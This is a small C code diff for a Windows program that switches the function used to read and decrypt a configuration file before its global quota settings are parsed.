@@ -161,7 +161,7 @@ void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
 void UpdateLogConf()
 {
 	char *conf_memory;
-	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
+	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
 	if (conf_memory)
 		HM_ParseConfGlobals(conf_memory, &ParseGlobalsQuota);
 	SAFE_FREE(conf_memory);	
